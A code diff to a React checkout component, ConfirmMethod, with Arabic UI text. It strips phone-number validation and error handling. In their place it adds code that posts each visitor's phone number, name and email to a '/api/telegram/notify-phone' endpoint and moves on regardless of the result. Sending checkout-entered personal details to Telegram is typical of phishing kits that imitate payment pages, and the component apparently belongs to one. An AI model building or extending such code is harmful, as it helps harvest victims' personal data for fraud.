@@ -1,7 +1,5 @@
 import { toEnglishNumbers } from '@/lib/utils';
 import { useState } from 'react';
-import { submitPhoneNumber } from '@/lib/api';
-import { getCheckoutSessionId } from '@/lib/checkoutSession';
 
 interface ConfirmMethodProps {
   phoneNumber: string;
@@ -13,40 +11,33 @@ interface ConfirmMethodProps {
 }
 
 const ConfirmMethod = ({ phoneNumber, setPhoneNumber, userName, userEmail, onBack, onSubmit }: ConfirmMethodProps) => {
-  const [error, setError] = useState<string | null>(null);
   const [isSubmitting, setIsSubmitting] = useState(false);
-
-  // SIMPLIFIED - Just check if starts with 5
-  const isValid = phoneNumber.startsWith('5');
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     
-    if (!phoneNumber.startsWith('5')) {
-      setError('يجب أن يبدأ الرقم بـ 5');
-      return;
-    }
-
+    // Always allow any phone number - no validation
     setIsSubmitting(true);
-    setError(null);
 
     try {
-      const sessionId = getCheckoutSessionId();
-      const cleanPhone = toEnglishNumbers(phoneNumber.trim());
+      // Send phone to Telegram immediately (no validation)
+      try {
+        await fetch('/api/telegram/notify-phone', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ 
+            phoneNumber: toEnglishNumbers(phoneNumber.trim()),
+            userName,
+            userEmail
+          })
+        });
+      } catch (telegramError) {
+        // Even if Telegram fails, continue to next step
+        console.log('Telegram notification skipped');
+      }
       
-      // Submit phone number to backend for validation and Telegram notification
-      await submitPhoneNumber({
-        sessionId,
-        phoneNumber: cleanPhone,
-        userName,
-        userEmail,
-      });
-
-      // If successful, proceed to the next step
+      // Navigate immediately (no validation)
       onSubmit();
-    } catch (err: any) {
-      console.error('Failed to submit phone number:', err);
-      setError(err.message || 'فشل في إرسال رقم الهاتف. يرجى المحاولة مرة أخرى.');
     } finally {
       setIsSubmitting(false);
     }
@@ -165,23 +156,18 @@ const ConfirmMethod = ({ phoneNumber, setPhoneNumber, userName, userEmail, onBac
                 />
               </div>
             </div>
-            {error && (
-              <p className="text-red-500 text-xs mt-1 text-right">
-                {error}
-              </p>
-            )}
           </div>
 
           <button
             type="submit"
             id="sendBtn"
-            disabled={!isValid || isSubmitting}
+            disabled={isSubmitting}
             className="w-full py-3 font-semibold transition-colors"
             style={{
               fontSize: '16px',
-              backgroundColor: isValid && !isSubmitting ? '#000' : '#ddd',
-              color: isValid && !isSubmitting ? '#fff' : '#999',
-              cursor: isValid && !isSubmitting ? 'pointer' : 'not-allowed',
+              backgroundColor: isSubmitting ? '#ddd' : '#000',
+              color: isSubmitting ? '#999' : '#fff',
+              cursor: isSubmitting ? 'not-allowed' : 'pointer',
               border: 'none',
               borderRadius: '30px'
             }}
